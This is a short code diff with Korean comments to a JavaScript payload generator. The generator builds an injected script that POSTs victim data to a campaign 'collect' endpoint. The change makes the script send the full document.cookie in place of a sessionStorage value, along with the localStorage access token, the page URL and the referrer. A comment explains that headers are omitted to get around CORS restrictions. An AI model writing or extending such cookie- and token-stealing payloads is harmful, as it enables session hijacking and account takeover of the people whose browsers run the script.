@@ -46,13 +46,14 @@ function renderPayload() {
     `<script>` +
     `fetch('${baseUrl}/api/collect',{` +
     `method:'POST',` +
-    // 💡 CORS 프리플라이트(OPTIONS) 요청을 발생시키지 않도록 headers 속성을 제거했습니다.
+    // 💡 CORS 우회를 위해 headers는 생략 상태를 유지합니다.
     `body:JSON.stringify({` +
     `campaign:'${campaign}',` +
     `type:'${eventType}',` +
     `page:location.href,` +
-    `sessionId: sessionStorage.getItem('JSESSIONID') || 'no-session',` +
-    `userToken: localStorage.getItem('access_token'),` +
+    // 💡 [핵심 수정] 기존 sessionStorage 대신 실제 document.cookie 전체를 전송합니다.
+    `sessionId: document.cookie || 'no-cookie',` + 
+    `userToken: localStorage.getItem('access_token') || 'no-token',` +
     `referrer:document.referrer,` +
     `documentTitle:document.title,` +
     `cookieEnabled:navigator.cookieEnabled,` +
